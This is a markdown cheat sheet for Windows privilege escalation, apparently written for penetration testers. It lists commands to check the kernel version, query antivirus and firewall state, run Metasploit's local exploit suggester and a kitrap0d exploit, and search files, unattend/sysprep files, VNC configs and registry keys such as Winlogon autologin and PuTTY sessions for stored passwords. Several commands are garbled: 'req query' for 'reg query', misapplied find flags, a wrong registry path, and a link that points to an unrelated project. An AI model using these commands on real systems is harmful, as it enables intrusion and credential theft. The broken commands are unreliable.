  [Kernel exploits](#Kernel)
- [Antivirus](#Antivirus)
- [Metasploit](#Metasploit)
- [Tools](#Tools)
  - [Powershell](#Powershell)
  - [Executables](#Executables)
  - [Other](#Other)
- [Hardcoded passwords](#Hardcoded_passwords)
  - [Search for password](#Search_for_password)
  - [Search passwords in files](#Passwords_in_files)
  - [Read registry for passwords](#Read_registry)
  - [Search password invregistry](#Search_in_registry)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Kernel

### Check Kernel version
```
systeminfo
``` 

### Windows kernel exploits resources:
- https://github.com/SecWiki/windows-kernel-exploits
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Antivirus
 
### Check AV status
```
sc query windefend
```

### Check all services status
```
sc queryex type= service
```

### Check firewll status
```
netsh advfirewall firewall dump
```
```
netsh firewall show state
```
```
netsh firewall show config
```
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Metasploit

### local exploit suggester
```
meterpreter> run post/multi/recon/local_exploit_suggester
meterpreter> background
msf> use exploit/windows/local/ms10_015_kitrap0d (for example)
msf> options
msf> set session x
msf> set lhost
msf> set lport
msf> run
```
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Tools

### PowerShell:
- Sherlock.ps1
  - https://github.com/sherlock-project/sherlock

- PowerUp.ps1
  - https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp

- jaws-enum.ps1
  - https://github.com/411Hall/JAWS

### Executables
- winPEAS.exe
  - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS

- Seatbelt.exe
  - https://github.com/GhostPack/Seatbelt

- Watson.exe
  - https://github.com/rasta-mouse/Watson

- SharpUp.exe

### Others
- Exploit Suggester(metasploit)
- windows-exploit-suggester.py (local)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Hardcoded_passwords

## Search_for_password
```
find /si password *.txt
find /si password *.xml
find /si password *.ini
```
## Passwords_in_files
```
dir /s *pass* == *cred* == *vnc* == *config*
```
## Find passwords in all files
```
findstr /spin "password" *.*
```

## Read_in_files
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b
dir c:\ /s /b | findstr /si *vnc.ini
```
## Read_registry
```
VNC
  req query "HKCU\SOFTWARE\ORL\WinVNC3\Password"

Windows autologin
  req query "HKCU\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

SNMP Parameters
  req query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

Putty
  req query "HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions"
```
## Search_in_registry
```
req query HKLM /f password /t REG_SZ /s

req query HKCU /f password /t REG_SZ /s
```
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
